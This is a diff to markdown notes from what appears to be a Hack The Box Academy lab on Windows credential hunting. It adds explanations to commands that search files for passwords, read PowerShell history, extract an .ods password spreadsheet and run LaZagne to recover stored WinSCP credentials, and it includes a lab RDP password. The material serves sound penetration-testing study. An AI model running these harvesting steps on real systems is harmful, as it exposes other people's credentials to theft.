@@ -30,6 +30,7 @@ Search for patterns across common file types:
 ```cmd
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 ```
+> Recursively searches (`/S`) the current directory for the literal string "password" (`/C:`) case-insensitively (`/I`) across common config and script file types. `/M` prints only matching filenames rather than every matching line.
 
 | Flag | Purpose |
 |------|---------|
@@ -45,6 +46,7 @@ Automatically extracts credentials from installed applications:
 ```cmd
 start LaZagne.exe all
 ```
+> Runs all LaZagne credential recovery modules. `start` opens a new window so output is visible. Use `-vv` for verbose output. Copy LaZagne to a local path first — it crashes when run from a UNC path like `\\tsclient\`.
 
 Use `-vv` for verbose output.
 
@@ -112,12 +114,14 @@ Use `-vv` for verbose output.
 ```bash
 xfreerdp /v:<TARGET_IP> /u:Bob /p:'HTB_@cademy_stdnt!' /dynamic-resolution /drive:share,/tmp
 ```
+> Opens RDP and mounts `/tmp` as `\\tsclient\share\` inside the session. Use this to transfer tools like LaZagne into the session without needing a separate file server.
 
 ### Step 1: PowerShell History
 
 ```powershell
 Get-Content (Get-PSReadLineOption).HistorySavePath
 ```
+> Reads the PowerShell command history file. The path varies by user — `Get-PSReadLineOption` finds it automatically. History often reveals passwords typed directly in previous commands.
 
 Revealed Bob's SSH usage and file paths — showed he previously accessed `passwords.txt` and ran `ssh` commands.
 
@@ -126,6 +130,7 @@ Revealed Bob's SSH usage and file paths — showed he previously accessed `passw
 ```powershell
 Get-ChildItem C:\Users\Bob\Desktop -Recurse -Force
 ```
+> Lists all files on Bob's Desktop including hidden items (`-Force`). `-Recurse` goes into subdirectories. Look for `.txt`, `.doc`, `.xlsx`, `.ods`, and `.kdbx` files that might contain credentials.
 
 Found:
 - `WorkStuff/GitlabAccessCodeJustIncase.txt` → **GitLab access code**
@@ -137,6 +142,7 @@ Copy-Item "C:\Users\Bob\Desktop\WorkStuff\Creds\passwords.ods" "C:\Users\Bob\Des
 Expand-Archive "C:\Users\Bob\Desktop\temp.zip" -DestinationPath "C:\Users\Bob\Desktop\odsextract" -Force
 Get-Content "C:\Users\Bob\Desktop\odsextract\content.xml"
 ```
+> OpenDocument Spreadsheet (`.ods`) files are ZIP archives. Rename to `.zip`, extract with `Expand-Archive`, and read `content.xml` to get the spreadsheet data as raw XML without needing LibreOffice.
 
 ### Step 3: LaZagne for WinSCP
 
@@ -146,6 +152,7 @@ Transfer LaZagne via RDP shared drive, copy locally, then run:
 Copy-Item "\\tsclient\share\LaZagne.exe" "C:\Users\Bob\Desktop\LaZagne.exe" -Force
 .\LaZagne.exe all
 ```
+> Copies LaZagne from the RDP shared drive to a local path, then runs it. Must copy locally first — LaZagne (PyInstaller) fails when run directly from `\\tsclient\`. Run from an elevated shell for full coverage.
 
 > **Note:** LaZagne crashes when run from UNC paths (`\\tsclient\`). Always copy locally first.
 
@@ -156,6 +163,7 @@ Decrypted WinSCP stored session → **file server credentials**
 ```powershell
 Get-ChildItem -Path C:\ -Include *.ps1,*.bat,*.yml,*.yaml,*.py -Recurse -Force -ErrorAction SilentlyContinue | Select-String -Pattern "password|default|router|new.user" -ErrorAction SilentlyContinue
 ```
+> Recursively searches all script and automation files on C: for credential-related keywords. `-ErrorAction SilentlyContinue` suppresses access-denied errors. Extend the pattern with `|credential|apikey` for broader coverage.
 
 Found:
 - **Ansible playbook** with hardcoded Edge-Router credentials
